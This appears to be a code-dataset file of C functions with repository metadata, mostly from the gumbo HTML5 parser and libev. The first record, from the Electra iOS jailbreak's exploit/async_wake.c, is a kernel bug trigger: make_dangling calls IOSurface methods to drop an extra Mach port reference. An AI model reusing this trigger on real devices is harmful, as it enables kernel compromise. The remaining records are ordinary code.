{"docstring": "// make_dangling will drop an extra reference on port\n// this is the actual bug:\n", "func_signal": "void make_dangling(mach_port_t port)", "code": "{\n  kern_return_t err;\n  \n  uint64_t inputScalar[16];\n  uint32_t inputScalarCnt = 0;\n  \n  char inputStruct[4096];\n  size_t inputStructCnt = 0x18;\n  \n  uint64_t* ivals = (uint64_t*)inputStruct;\n  ivals[0] = 1;\n  ivals[1] = 2;\n  ivals[2] = 3;\n  \n  uint64_t outputScalar[16];\n  uint32_t outputScalarCnt = 0;\n  \n  char outputStruct[4096];\n  size_t outputStructCnt = 0;\n  \n  mach_port_insert_right(mach_task_self(), port, port, MACH_MSG_TYPE_MAKE_SEND);\n  \n  uint64_t reference[8] = {0};\n  uint32_t referenceCnt = 1;\n  \n  for (int i = 0; i < 2; i++) {\n    err = IOConnectCallAsyncMethod(\n                                   user_client,\n                                   17,  // s_set_surface_notify\n                                   port,\n                                   reference,\n                                   referenceCnt,\n                                   inputScalar,\n                                   inputScalarCnt,\n                                   inputStruct,\n                                   inputStructCnt,\n                                   outputScalar,\n                                   &outputScalarCnt,\n                                   outputStruct,\n                                   &outputStructCnt);\n    \n    printf(\"%x\\n\", err);\n  };\n  \n  err = IOConnectCallMethod(\n                            user_client,\n                            18,  // s_remove_surface_notify\n                            inputScalar,\n                            inputScalarCnt,\n                            inputStruct,\n                            inputStructCnt,\n                            outputScalar,\n                            &outputScalarCnt,\n                            outputStruct,\n                            &outputStructCnt);\n  \n  printf(\"%x\\n\", err);\n}", "path": "electra/electra/exploit/async_wake.c", "commit_date": "2018-01-27 00:00:00", "repo_name": "coolstar/electra", "stars": 657, "license": "gpl-3.0", "language": "c", "size": 53550}
{"docstring": "// http://www.whatwg.org/specs/web-apps/current-work/complete/tokenization.html#parsing-main-inheadnoscript\n", "func_signal": "static bool handle_in_head_noscript(GumboParser* parser, GumboToken* token)", "code": "{\n  switch (token->type) {\n    case GUMBO_TOKEN_DOCTYPE:\n      parser_add_parse_error(parser, token);\n      return false;\n    case GUMBO_TOKEN_WHITESPACE:\n    case GUMBO_TOKEN_COMMENT:\n      return handle_in_head(parser, token);\n    case GUMBO_TOKEN_START_TAG:\n      switch (token->v.start_tag.tag) {\n        case GUMBO_TAG_BASEFONT:\n        case GUMBO_TAG_BGSOUND:\n        case GUMBO_TAG_LINK:\n        case GUMBO_TAG_META:\n        case GUMBO_TAG_NOFRAMES:\n        case GUMBO_TAG_STYLE:\n          return handle_in_head(parser, token);\n        case GUMBO_TAG_HTML:\n          return handle_in_body(parser, token);\n        case GUMBO_TAG_HEAD:\n        case GUMBO_TAG_NOSCRIPT:\n          parser_add_parse_error(parser, token);\n          ignore_token(parser);\n          return false;\n        default:\n          break;\n      }\n      break;\n    case GUMBO_TOKEN_END_TAG:\n      switch (token->v.end_tag) {\n        case GUMBO_TAG_NOSCRIPT: {\n          const GumboNode* node = pop_current_node(parser);\n          assert(node_html_tag_is(node, GUMBO_TAG_NOSCRIPT));\n          AVOID_UNUSED_VARIABLE_WARNING(node);\n          set_insertion_mode(parser, GUMBO_INSERTION_MODE_IN_HEAD);\n          return true;\n        }\n        case GUMBO_TAG_BR:\n          break;\n        default:\n          parser_add_parse_error(parser, token);\n          ignore_token(parser);\n          return false;\n      }\n      break;\n    default:\n      break;\n  }\n  parser_add_parse_error(parser, token);\n  const GumboNode* node = pop_current_node(parser);\n  assert(node_html_tag_is(node, GUMBO_TAG_NOSCRIPT));\n  AVOID_UNUSED_VARIABLE_WARNING(node);\n  set_insertion_mode(parser, GUMBO_INSERTION_MODE_IN_HEAD);\n  parser->_parser_state->_reprocess_current_token = true;\n  return false;\n}", "path": "html5-parser/gumbo/parser.c", "commit_date": "2020-12-16 00:00:00", "repo_name": "kovidgoyal/html5-parser", "stars": 660, "license": "apache-2.0", "language": "c", "size": 948}
{"docstring": "// http://www.whatwg.org/specs/web-apps/current-work/complete/tokenization.html#parsing-main-incolgroup\n", "func_signal": "static bool handle_in_column_group(GumboParser* parser, GumboToken* token)", "code": "{\n  switch (token->type) {\n    case GUMBO_TOKEN_WHITESPACE:\n      insert_text_token(parser, token);\n      return true;\n    case GUMBO_TOKEN_DOCTYPE:\n      parser_add_parse_error(parser, token);\n      ignore_token(parser);\n      return false;\n    case GUMBO_TOKEN_COMMENT:\n      append_comment_node(parser, get_current_node(parser), token);\n      return true;\n    case GUMBO_TOKEN_EOF:\n      return handle_in_body(parser, token);\n    case GUMBO_TOKEN_START_TAG:\n      switch (token->v.start_tag.tag) {\n        case GUMBO_TAG_HTML:\n          return handle_in_body(parser, token);\n        case GUMBO_TAG_COL:\n          insert_element_from_token(parser, token);\n          pop_current_node(parser);\n          acknowledge_self_closing_tag(parser);\n          return true;\n        case GUMBO_TAG_TEMPLATE:\n          return handle_in_head(parser, token);\n        default:\n          break;\n      }\n      break;\n    case GUMBO_TOKEN_END_TAG:\n      switch (token->v.end_tag) {\n        case GUMBO_TAG_COLGROUP:\n          if (!node_html_tag_is(get_current_node(parser), GUMBO_TAG_COLGROUP)) {\n            parser_add_parse_error(parser, token);\n            ignore_token(parser);\n            return false;\n          }\n          pop_current_node(parser);\n          set_insertion_mode(parser, GUMBO_INSERTION_MODE_IN_TABLE);\n          return false;\n        case GUMBO_TAG_COL:\n          parser_add_parse_error(parser, token);\n          ignore_token(parser);\n          return false;\n        case GUMBO_TAG_TEMPLATE:\n          return handle_in_head(parser, token);\n        default:\n          break;\n      }\n      break;\n    default:\n      break;\n  }\n  if (!node_html_tag_is(get_current_node(parser), GUMBO_TAG_COLGROUP)) {\n    parser_add_parse_error(parser, token);\n    ignore_token(parser);\n    return false;\n  }\n  pop_current_node(parser);\n  set_insertion_mode(parser, GUMBO_INSERTION_MODE_IN_TABLE);\n  parser->_parser_state->_reprocess_current_token = true;\n  return true;\n}", "path": "html5-parser/gumbo/parser.c", "commit_date": "2020-12-16 00:00:00", "repo_name": "kovidgoyal/html5-parser", "stars": 660, "license": "apache-2.0", "language": "c", "size": 948}
{"docstring": "// Like tag_in, but checks for the tag of a node, rather than a token.\n", "func_signal": "static bool node_tag_in_set(const GumboNode* node, const gumbo_tagset tags)", "code": "{\n  assert(node != NULL);\n  if (node->type != GUMBO_NODE_ELEMENT && node->type != GUMBO_NODE_TEMPLATE) {\n    return false;\n  }\n  return TAGSET_INCLUDES(\n      tags, node->v.element.tag_namespace, node->v.element.tag);\n}", "path": "html5-parser/gumbo/parser.c", "commit_date": "2020-12-16 00:00:00", "repo_name": "kovidgoyal/html5-parser", "stars": 660, "license": "apache-2.0", "language": "c", "size": 948}
{"docstring": "// \"Reconstruct active formatting elements\" part of the spec.\n// This implementation is based on the html5lib translation from the mess of\n// GOTOs in the spec to reasonably structured programming.\n// http://code.google.com/p/html5lib/source/browse/python/html5lib/treebuilders/_base.py\n", "func_signal": "static void reconstruct_active_formatting_elements(GumboParser* parser)", "code": "{\n  GumboVector* elements = &parser->_parser_state->_active_formatting_elements;\n  // Step 1\n  if (elements->length == 0) {\n    return;\n  }\n\n  // Step 2 & 3\n  int i = elements->length - 1;\n  const GumboNode* element = elements->data[i];\n  if (element == &kActiveFormattingScopeMarker ||\n      is_open_element(parser, element)) {\n    return;\n  }\n\n  // Step 6\n  do {\n    if (i == 0) {\n      // Step 4\n      i = -1;  // Incremented to 0 below.\n      break;\n    }\n    // Step 5\n    element = elements->data[--i];\n  } while (element != &kActiveFormattingScopeMarker &&\n           !is_open_element(parser, element));\n\n  ++i;\n  gumbo_debug(\"Reconstructing elements from %d on %s parent.\\n\", i,\n      gumbo_normalized_tagname(get_current_node(parser)->v.element.tag));\n  for (unsigned int c = i; c < elements->length; ++c) {\n    // Step 7 & 8.\n    assert(elements->length > 0);\n    assert(c < elements->length);\n    element = elements->data[c];\n    assert(element != &kActiveFormattingScopeMarker);\n    GumboNode* clone =\n        clone_node(element, GUMBO_INSERTION_RECONSTRUCTED_FORMATTING_ELEMENT);\n    // Step 9.\n    InsertionLocation location =\n        get_appropriate_insertion_location(parser, NULL);\n    insert_node(clone, location);\n    gumbo_vector_add((void*) clone, &parser->_parser_state->_open_elements);\n\n    // Step 10.\n    elements->data[c] = clone;\n    gumbo_debug(\"Reconstructed %s element at %d.\\n\",\n        gumbo_normalized_tagname(clone->v.element.tag), c);\n  }\n}", "path": "html5-parser/gumbo/parser.c", "commit_date": "2020-12-16 00:00:00", "repo_name": "kovidgoyal/html5-parser", "stars": 660, "license": "apache-2.0", "language": "c", "size": 948}
{"docstring": "// http://www.whatwg.org/specs/web-apps/current-work/multipage/tree-construction.html#mathml-text-integration-point\n", "func_signal": "static bool is_mathml_integration_point(const GumboNode* node)", "code": "{\n  return node_tag_in_set(\n      node, (gumbo_tagset){TAG_MATHML(MI), TAG_MATHML(MO), TAG_MATHML(MN),\n                TAG_MATHML(MS), TAG_MATHML(MTEXT)});\n}", "path": "html5-parser/gumbo/parser.c", "commit_date": "2020-12-16 00:00:00", "repo_name": "kovidgoyal/html5-parser", "stars": 660, "license": "apache-2.0", "language": "c", "size": 948}
{"docstring": "// http://www.whatwg.org/specs/web-apps/current-work/multipage/parsing.html#has-an-element-in-button-scope\n", "func_signal": "static bool has_an_element_in_button_scope(GumboParser* parser, GumboTag tag)", "code": "{\n  return has_an_element_in_specific_scope(parser, 1, &tag, false,\n      (gumbo_tagset){TAG(APPLET), TAG(CAPTION), TAG(HTML), TAG(TABLE), TAG(TD),\n          TAG(TH), TAG(MARQUEE), TAG(OBJECT), TAG(TEMPLATE), TAG_MATHML(MI),\n          TAG_MATHML(MO), TAG_MATHML(MN), TAG_MATHML(MS), TAG_MATHML(MTEXT),\n          TAG_MATHML(ANNOTATION_XML), TAG_SVG(FOREIGNOBJECT), TAG_SVG(DESC),\n          TAG_SVG(TITLE), TAG(BUTTON)});\n}", "path": "html5-parser/gumbo/parser.c", "commit_date": "2020-12-16 00:00:00", "repo_name": "kovidgoyal/html5-parser", "stars": 660, "license": "apache-2.0", "language": "c", "size": 948}
{"docstring": "// http://www.whatwg.org/specs/web-apps/current-work/complete/tokenization.html#parsing-main-intabletext\n", "func_signal": "static bool handle_in_table_text(GumboParser* parser, GumboToken* token)", "code": "{\n  switch (token->type) {\n    case GUMBO_TOKEN_NULL:\n      parser_add_parse_error(parser, token);\n      ignore_token(parser);\n      return false;\n    case GUMBO_TOKEN_CHARACTER:\n    case GUMBO_TOKEN_WHITESPACE:\n      insert_text_token(parser, token);\n      return true;\n    default:\n      break;\n  }\n  GumboParserState* state = parser->_parser_state;\n  GumboStringBuffer* buffer = &state->_text_node._buffer;\n  // Can't use strspn for this because GumboStringBuffers are not\n  // null-terminated.\n  // Note that TextNodeBuffer may contain UTF-8 characters, but the presence\n  // of any one byte that is not whitespace means we flip the flag, so this\n  // loop is still valid.\n  for (unsigned int i = 0; i < buffer->length; ++i) {\n    if (!gumbo_isspace((unsigned char) buffer->data[i]) ||\n        buffer->data[i] == '\\v') {\n      state->_foster_parent_insertions = true;\n      reconstruct_active_formatting_elements(parser);\n      break;\n    }\n  }\n  maybe_flush_text_node_buffer(parser);\n  state->_foster_parent_insertions = false;\n  state->_reprocess_current_token = true;\n  state->_insertion_mode = state->_original_insertion_mode;\n  return true;\n}", "path": "html5-parser/gumbo/parser.c", "commit_date": "2020-12-16 00:00:00", "repo_name": "kovidgoyal/html5-parser", "stars": 660, "license": "apache-2.0", "language": "c", "size": 948}
{"docstring": "// Convenience function to encapsulate the logic for closing <li> or <dd>/<dt>\n// tags.  Pass true to is_li for handling <li> tags, false for <dd> and <dt>.\n", "func_signal": "static void maybe_implicitly_close_list_tag(\n    GumboParser* parser, GumboToken* token, bool is_li)", "code": "{\n  GumboParserState* state = parser->_parser_state;\n  state->_frameset_ok = false;\n  for (int i = state->_open_elements.length; --i >= 0;) {\n    const GumboNode* node = state->_open_elements.data[i];\n    bool is_list_tag =\n        is_li ? node_html_tag_is(node, GUMBO_TAG_LI)\n              : node_tag_in_set(node, (gumbo_tagset){TAG(DD), TAG(DT)});\n    if (is_list_tag) {\n      implicitly_close_tags(\n          parser, token, node->v.element.tag_namespace, node->v.element.tag);\n      return;\n    }\n    if (is_special_node(node) &&\n        !node_tag_in_set(\n            node, (gumbo_tagset){TAG(ADDRESS), TAG(DIV), TAG(P)})) {\n      return;\n    }\n  }\n}", "path": "html5-parser/gumbo/parser.c", "commit_date": "2020-12-16 00:00:00", "repo_name": "kovidgoyal/html5-parser", "stars": 660, "license": "apache-2.0", "language": "c", "size": 948}
{"docstring": "// Appends a node to the end of its parent, setting the \"parent\" and\n// \"index_within_parent\" fields appropriately.\n", "func_signal": "static void append_node(GumboNode* parent, GumboNode* node)", "code": "{\n  assert(node->parent == NULL);\n  assert(node->index_within_parent == UINT_MAX);\n  GumboVector* children;\n  if (parent->type == GUMBO_NODE_ELEMENT ||\n      parent->type == GUMBO_NODE_TEMPLATE) {\n    children = &parent->v.element.children;\n  } else {\n    assert(parent->type == GUMBO_NODE_DOCUMENT);\n    children = &parent->v.document.children;\n  }\n  node->parent = parent;\n  node->index_within_parent = children->length;\n  gumbo_vector_add((void*) node, children);\n  assert(node->index_within_parent < children->length);\n}", "path": "html5-parser/gumbo/parser.c", "commit_date": "2020-12-16 00:00:00", "repo_name": "kovidgoyal/html5-parser", "stars": 660, "license": "apache-2.0", "language": "c", "size": 948}
{"docstring": "// Like node_tag_in, but for the single-tag case.\n", "func_signal": "static bool node_qualified_tag_is(\n    const GumboNode* node, GumboNamespaceEnum ns, GumboTag tag)", "code": "{\n  return (node->type == GUMBO_NODE_ELEMENT ||\n             node->type == GUMBO_NODE_TEMPLATE) &&\n         node->v.element.tag == tag && node->v.element.tag_namespace == ns;\n}", "path": "html5-parser/gumbo/parser.c", "commit_date": "2020-12-16 00:00:00", "repo_name": "kovidgoyal/html5-parser", "stars": 660, "license": "apache-2.0", "language": "c", "size": 948}
{"docstring": "// Convenience method that combines create_element and insert_element, inserting\n// a parser-generated element of a specific tag type.  Returns the node\n// inserted.\n", "func_signal": "static GumboNode* insert_element_of_tag_type(\n    GumboParser* parser, GumboTag tag, GumboParseFlags reason)", "code": "{\n  GumboNode* element = create_element(parser, tag);\n  element->parse_flags |= GUMBO_INSERTION_BY_PARSER | reason;\n  insert_element(parser, element, false);\n  gumbo_debug(\"Inserting %s element (@%x) from tag type.\\n\",\n      gumbo_normalized_tagname(tag), element);\n  return element;\n}", "path": "html5-parser/gumbo/parser.c", "commit_date": "2020-12-16 00:00:00", "repo_name": "kovidgoyal/html5-parser", "stars": 660, "license": "apache-2.0", "language": "c", "size": 948}
{"docstring": "// This factors out the clauses relating to \"act as if an end tag token with tag\n// name \"table\" had been seen.  Returns true if there's a table element in table\n// scope which was successfully closed, false if not and the token should be\n// ignored.  Does not add parse errors; callers should handle that.\n", "func_signal": "static bool close_table(GumboParser* parser)", "code": "{\n  if (!has_an_element_in_table_scope(parser, GUMBO_TAG_TABLE)) {\n    return false;\n  }\n\n  GumboNode* node = pop_current_node(parser);\n  while (!node_html_tag_is(node, GUMBO_TAG_TABLE)) {\n    node = pop_current_node(parser);\n  }\n  reset_insertion_mode_appropriately(parser);\n  return true;\n}", "path": "html5-parser/gumbo/parser.c", "commit_date": "2020-12-16 00:00:00", "repo_name": "kovidgoyal/html5-parser", "stars": 660, "license": "apache-2.0", "language": "c", "size": 948}
{"docstring": "// http://www.whatwg.org/specs/web-apps/current-work/complete/parsing.html#reset-the-insertion-mode-appropriately\n// This is a helper function that returns the appropriate insertion mode instead\n// of setting it.  Returns GUMBO_INSERTION_MODE_INITIAL as a sentinel value to\n// indicate that there is no appropriate insertion mode, and the loop should\n// continue.\n", "func_signal": "static GumboInsertionMode get_appropriate_insertion_mode(\n    const GumboParser* parser, int index)", "code": "{\n  const GumboVector* open_elements = &parser->_parser_state->_open_elements;\n  const GumboNode* node = open_elements->data[index];\n  const bool is_last = index == 0;\n\n  if (is_last && is_fragment_parser(parser)) {\n    node = parser->_parser_state->_fragment_ctx;\n  }\n\n  assert(node->type == GUMBO_NODE_ELEMENT || node->type == GUMBO_NODE_TEMPLATE);\n  if (node->v.element.tag_namespace != GUMBO_NAMESPACE_HTML)\n    return is_last ? GUMBO_INSERTION_MODE_IN_BODY\n                   : GUMBO_INSERTION_MODE_INITIAL;\n\n  switch (node->v.element.tag) {\n    case GUMBO_TAG_SELECT: {\n      if (is_last) {\n        return GUMBO_INSERTION_MODE_IN_SELECT;\n      }\n      for (int i = index; i > 0; --i) {\n        const GumboNode* ancestor = open_elements->data[i];\n        if (node_html_tag_is(ancestor, GUMBO_TAG_TEMPLATE)) {\n          return GUMBO_INSERTION_MODE_IN_SELECT;\n        }\n        if (node_html_tag_is(ancestor, GUMBO_TAG_TABLE)) {\n          return GUMBO_INSERTION_MODE_IN_SELECT_IN_TABLE;\n        }\n      }\n      return GUMBO_INSERTION_MODE_IN_SELECT;\n    }\n    case GUMBO_TAG_TD:\n    case GUMBO_TAG_TH:\n      if (!is_last) return GUMBO_INSERTION_MODE_IN_CELL;\n      break;\n    case GUMBO_TAG_TR:\n      return GUMBO_INSERTION_MODE_IN_ROW;\n    case GUMBO_TAG_TBODY:\n    case GUMBO_TAG_THEAD:\n    case GUMBO_TAG_TFOOT:\n      return GUMBO_INSERTION_MODE_IN_TABLE_BODY;\n    case GUMBO_TAG_CAPTION:\n      return GUMBO_INSERTION_MODE_IN_CAPTION;\n    case GUMBO_TAG_COLGROUP:\n      return GUMBO_INSERTION_MODE_IN_COLUMN_GROUP;\n    case GUMBO_TAG_TABLE:\n      return GUMBO_INSERTION_MODE_IN_TABLE;\n    case GUMBO_TAG_TEMPLATE:\n      return get_current_template_insertion_mode(parser);\n    case GUMBO_TAG_HEAD:\n      if (!is_last) return GUMBO_INSERTION_MODE_IN_HEAD;\n      break;\n    case GUMBO_TAG_BODY:\n      return GUMBO_INSERTION_MODE_IN_BODY;\n    case GUMBO_TAG_FRAMESET:\n      return GUMBO_INSERTION_MODE_IN_FRAMESET;\n    case GUMBO_TAG_HTML:\n      return parser->_parser_state->_head_element\n                 ? GUMBO_INSERTION_MODE_AFTER_HEAD\n                 : GUMBO_INSERTION_MODE_BEFORE_HEAD;\n    default:\n      break;\n  }\n  return is_last ? GUMBO_INSERTION_MODE_IN_BODY : GUMBO_INSERTION_MODE_INITIAL;\n}", "path": "html5-parser/gumbo/parser.c", "commit_date": "2020-12-16 00:00:00", "repo_name": "kovidgoyal/html5-parser", "stars": 660, "license": "apache-2.0", "language": "c", "size": 948}
{"docstring": "// http://www.whatwg.org/specs/web-apps/current-work/complete/tokenization.html#parsing-main-intr\n", "func_signal": "static inline bool reprocess_in_table_row(\n    GumboParser* parser, GumboToken* token)", "code": "{\n  if (!has_an_element_in_table_scope(parser, GUMBO_TAG_TR)) {\n    parser_add_parse_error(parser, token);\n    ignore_token(parser);\n    return false;\n  } else {\n    clear_stack_to_table_row_context(parser);\n    pop_current_node(parser);\n    set_insertion_mode(parser, GUMBO_INSERTION_MODE_IN_TABLE_BODY);\n    parser->_parser_state->_reprocess_current_token = true;\n    return true;\n  }\n}", "path": "html5-parser/gumbo/parser.c", "commit_date": "2020-12-16 00:00:00", "repo_name": "kovidgoyal/html5-parser", "stars": 660, "license": "apache-2.0", "language": "c", "size": 948}
{"docstring": "// Checks if the specified attribute vectors are identical.\n", "func_signal": "static bool all_attributes_match(\n    const GumboVector* attr1, const GumboVector* attr2)", "code": "{\n  int num_unmatched_attr2_elements = attr2->length;\n  for (unsigned int i = 0; i < attr1->length; ++i) {\n    const GumboAttribute* attr = attr1->data[i];\n    if (attribute_matches_case_sensitive(attr2, attr->name, attr->value)) {\n      --num_unmatched_attr2_elements;\n    } else {\n      return false;\n    }\n  }\n  return num_unmatched_attr2_elements == 0;\n}", "path": "html5-parser/gumbo/parser.c", "commit_date": "2020-12-16 00:00:00", "repo_name": "kovidgoyal/html5-parser", "stars": 660, "license": "apache-2.0", "language": "c", "size": 948}
{"docstring": "// Like \"has an element in scope\", but for the specific case of looking for a\n// unique target node, not for any node with a given tag name.  This duplicates\n// much of the algorithm from has_an_element_in_specific_scope because the\n// predicate is different when checking for an exact node, and it's easier &\n// faster just to duplicate the code for this one case than to try and\n// parameterize it.\n", "func_signal": "static bool has_node_in_scope(GumboParser* parser, const GumboNode* node)", "code": "{\n  GumboVector* open_elements = &parser->_parser_state->_open_elements;\n  for (int i = open_elements->length; --i >= 0;) {\n    const GumboNode* current = open_elements->data[i];\n    if (current == node) {\n      return true;\n    }\n    if (current->type != GUMBO_NODE_ELEMENT &&\n        current->type != GUMBO_NODE_TEMPLATE) {\n      continue;\n    }\n    if (node_tag_in_set(current,\n            (gumbo_tagset){TAG(APPLET), TAG(CAPTION), TAG(HTML), TAG(TABLE),\n                TAG(TD), TAG(TH), TAG(MARQUEE), TAG(OBJECT), TAG(TEMPLATE),\n                TAG_MATHML(MI), TAG_MATHML(MO), TAG_MATHML(MN), TAG_MATHML(MS),\n                TAG_MATHML(MTEXT), TAG_MATHML(ANNOTATION_XML),\n                TAG_SVG(FOREIGNOBJECT), TAG_SVG(DESC), TAG_SVG(TITLE)})) {\n      return false;\n    }\n  }\n  assert(false);\n  return false;\n}", "path": "html5-parser/gumbo/parser.c", "commit_date": "2020-12-16 00:00:00", "repo_name": "kovidgoyal/html5-parser", "stars": 660, "license": "apache-2.0", "language": "c", "size": 948}
{"docstring": "// Returns the node at the bottom of the stack of open elements, or NULL if no\n// elements have been added yet.\n", "func_signal": "static GumboNode* get_current_node(GumboParser* parser)", "code": "{\n  GumboVector* open_elements = &parser->_parser_state->_open_elements;\n  if (open_elements->length == 0) {\n    assert(!parser->_output->root);\n    return NULL;\n  }\n  assert(open_elements->length > 0);\n  assert(open_elements->data != NULL);\n  return open_elements->data[open_elements->length - 1];\n}", "path": "html5-parser/gumbo/parser.c", "commit_date": "2020-12-16 00:00:00", "repo_name": "kovidgoyal/html5-parser", "stars": 660, "license": "apache-2.0", "language": "c", "size": 948}
{"docstring": "// Checks if the value of the specified attribute is a case-sensitive match\n// for the specified string.\n", "func_signal": "static bool attribute_matches_case_sensitive(\n    const GumboVector* attributes, const char* name, const char* value)", "code": "{\n  const GumboAttribute* attr = gumbo_get_attribute(attributes, name);\n  return attr ? strcmp(value, attr->value) == 0 : false;\n}", "path": "html5-parser/gumbo/parser.c", "commit_date": "2020-12-16 00:00:00", "repo_name": "kovidgoyal/html5-parser", "stars": 660, "license": "apache-2.0", "language": "c", "size": 948}
{"docstring": "// http://www.whatwg.org/specs/web-apps/current-work/complete/tokenization.html#adjust-svg-attributes\n// This destructively modifies any matching attributes on the token.\n", "func_signal": "static void adjust_svg_attributes(GumboToken* token)", "code": "{\n  assert(token->type == GUMBO_TOKEN_START_TAG);\n  const GumboVector* attributes = &token->v.start_tag.attributes;\n  for (unsigned int i = 0, n = attributes->length; i < n; i++) {\n    GumboAttribute* attr = (GumboAttribute*) attributes->data[i];\n    const StringReplacement* replacement = gumbo_get_svg_attr_replacement(attr->name, attr->original_name.length);\n    if (!replacement) {\n      continue;\n    }\n    /* TODO:vmg refactor to use attribute helpers */\n    gumbo_free((void*) attr->name);\n    attr->name = gumbo_strdup(replacement->to);\n  }\n}", "path": "html5-parser/gumbo/parser.c", "commit_date": "2020-12-16 00:00:00", "repo_name": "kovidgoyal/html5-parser", "stars": 660, "license": "apache-2.0", "language": "c", "size": 948}
{"docstring": "// http://www.whatwg.org/specs/web-apps/current-work/complete/tokenization.html#parsing-main-inforeign\n", "func_signal": "static bool handle_in_foreign_content(GumboParser* parser, GumboToken* token)", "code": "{\n  switch (token->type) {\n    case GUMBO_TOKEN_NULL:\n      parser_add_parse_error(parser, token);\n      token->v.character = kUtf8ReplacementChar;\n      insert_text_token(parser, token);\n      return false;\n    case GUMBO_TOKEN_WHITESPACE:\n      insert_text_token(parser, token);\n      return true;\n    case GUMBO_TOKEN_CDATA:\n    case GUMBO_TOKEN_CHARACTER:\n      insert_text_token(parser, token);\n      set_frameset_not_ok(parser);\n      return true;\n    case GUMBO_TOKEN_COMMENT:\n      append_comment_node(parser, get_current_node(parser), token);\n      return true;\n    case GUMBO_TOKEN_DOCTYPE:\n      parser_add_parse_error(parser, token);\n      ignore_token(parser);\n      return false;\n    default:\n      // Fall through to the if-statements below.\n      break;\n  }\n  // Order matters for these clauses.\n  if (tag_in(token, kStartTag,\n          (gumbo_tagset){TAG(B), TAG(BIG), TAG(BLOCKQUOTE), TAG(BODY), TAG(BR),\n              TAG(CENTER), TAG(CODE), TAG(DD), TAG(DIV), TAG(DL), TAG(DT),\n              TAG(EM), TAG(EMBED), TAG(H1), TAG(H2), TAG(H3), TAG(H4), TAG(H5),\n              TAG(H6), TAG(HEAD), TAG(HR), TAG(I), TAG(IMG), TAG(LI),\n              TAG(LISTING), TAG(MENU), TAG(META), TAG(NOBR), TAG(OL), TAG(P),\n              TAG(PRE), TAG(RUBY), TAG(S), TAG(SMALL), TAG(SPAN), TAG(STRONG),\n              TAG(STRIKE), TAG(SUB), TAG(SUP), TAG(TABLE), TAG(TT), TAG(U),\n              TAG(UL), TAG(VAR)}) ||\n      (tag_is(token, kStartTag, GUMBO_TAG_FONT) &&\n          (token_has_attribute(token, \"color\") ||\n              token_has_attribute(token, \"face\") ||\n              token_has_attribute(token, \"size\")))) {\n    /* Parse error */\n    parser_add_parse_error(parser, token);\n\n    /*\n     * Fragment case: If the parser was originally created for the HTML\n     * fragment parsing algorithm, then act as described in the \"any other\n     * start tag\" entry below.\n     */\n    if (!is_fragment_parser(parser)) {\n      do {\n        pop_current_node(parser);\n      } while (!(is_mathml_integration_point(get_current_node(parser)) ||\n                 is_html_integration_point(get_current_node(parser)) ||\n                 get_current_node(parser)->v.element.tag_namespace ==\n                     GUMBO_NAMESPACE_HTML));\n      parser->_parser_state->_reprocess_current_token = true;\n      return false;\n    }\n\n    assert(token->type == GUMBO_TOKEN_START_TAG);\n  }\n\n  if (token->type == GUMBO_TOKEN_START_TAG) {\n    const GumboNamespaceEnum current_namespace =\n        get_adjusted_current_node(parser)->v.element.tag_namespace;\n    if (current_namespace == GUMBO_NAMESPACE_MATHML) {\n      adjust_mathml_attributes(token);\n    }\n    if (current_namespace == GUMBO_NAMESPACE_SVG) {\n      // Tag adjustment is left to the gumbo_normalize_svg_tagname helper\n      // function.\n      adjust_svg_attributes(token);\n    }\n    adjust_foreign_attributes(token);\n    insert_foreign_element(parser, token, current_namespace);\n    if (token->v.start_tag.is_self_closing) {\n      pop_current_node(parser);\n      acknowledge_self_closing_tag(parser);\n    }\n    return true;\n    // </script> tags are handled like any other end tag, putting the script's\n    // text into a text node child and closing the current node.\n  } else {\n    assert(token->type == GUMBO_TOKEN_END_TAG);\n    GumboNode* node = get_current_node(parser);\n    assert(node != NULL);\n    GumboStringPiece token_tagname = token->original_text;\n    GumboStringPiece node_tagname = node->v.element.original_tag;\n    gumbo_tag_from_original_text(&token_tagname);\n    gumbo_tag_from_original_text(&node_tagname);\n\n    bool is_success = true;\n    if (!gumbo_string_equals_ignore_case(&node_tagname, &token_tagname)) {\n      parser_add_parse_error(parser, token);\n      is_success = false;\n    }\n    int i = parser->_parser_state->_open_elements.length;\n    for (--i; i > 0;) {\n      // Here we move up the stack until we find an HTML element (in which\n      // case we do nothing) or we find the element that we're about to\n      // close (in which case we pop everything we've seen until that\n      // point.)\n      gumbo_debug(\"Foreign %.*s node at %d.\\n\", node_tagname.length,\n          node_tagname.data, i);\n      if (gumbo_string_equals_ignore_case(&node_tagname, &token_tagname)) {\n        gumbo_debug(\"Matches.\\n\");\n        while (pop_current_node(parser) != node) {\n          // Pop all the nodes below the current one.  Node is guaranteed to\n          // be an element on the stack of open elements (set below), so\n          // this loop is guaranteed to terminate.\n        }\n        return is_success;\n      }\n      --i;\n      node = parser->_parser_state->_open_elements.data[i];\n      if (node->v.element.tag_namespace == GUMBO_NAMESPACE_HTML) {\n        // Must break before gumbo_tag_from_original_text to avoid passing\n        // parser-inserted nodes through.\n        break;\n      }\n      node_tagname = node->v.element.original_tag;\n      gumbo_tag_from_original_text(&node_tagname);\n    }\n    assert(node->v.element.tag_namespace == GUMBO_NAMESPACE_HTML);\n    // We can't call handle_token directly because the current node is still in\n    // the SVG namespace, so it would re-enter this and result in infinite\n    // recursion.\n    return handle_html_content(parser, token) && is_success;\n  }\n}", "path": "html5-parser/gumbo/parser.c", "commit_date": "2020-12-16 00:00:00", "repo_name": "kovidgoyal/html5-parser", "stars": 660, "license": "apache-2.0", "language": "c", "size": 948}
{"docstring": "/* called whenever the libev signal pipe */\n/* got some events (signal, async) */\n", "func_signal": "static void\npipecb (EV_P_ ev_io *iow, int revents)", "code": "{\n  int i;\n\n  if (revents & EV_READ)\n    {\n#if EV_USE_EVENTFD\n      if (evfd >= 0)\n        {\n          uint64_t counter;\n          read (evfd, &counter, sizeof (uint64_t));\n        }\n      else\n#endif\n        {\n          char dummy;\n          /* see discussion in evpipe_write when you think this read should be recv in win32 */\n          read (evpipe [0], &dummy, 1);\n        }\n    }\n\n  pipe_write_skipped = 0;\n\n#if EV_SIGNAL_ENABLE\n  if (sig_pending)\n    {\n      sig_pending = 0;\n\n      for (i = EV_NSIG - 1; i--; )\n        if (expect_false (signals [i].pending))\n          ev_feed_signal_event (EV_A_ i + 1);\n    }\n#endif\n\n#if EV_ASYNC_ENABLE\n  if (async_pending)\n    {\n      async_pending = 0;\n\n      for (i = asynccnt; i--; )\n        if (asyncs [i]->sent)\n          {\n            asyncs [i]->sent = 0;\n            ev_feed_event (EV_A_ asyncs [i], EV_ASYNC);\n          }\n    }\n#endif\n}", "path": "sol/deps/libev/ev.c", "commit_date": "2012-10-15 00:00:00", "repo_name": "rsms/sol", "stars": 518, "license": "None", "language": "c", "size": 719}
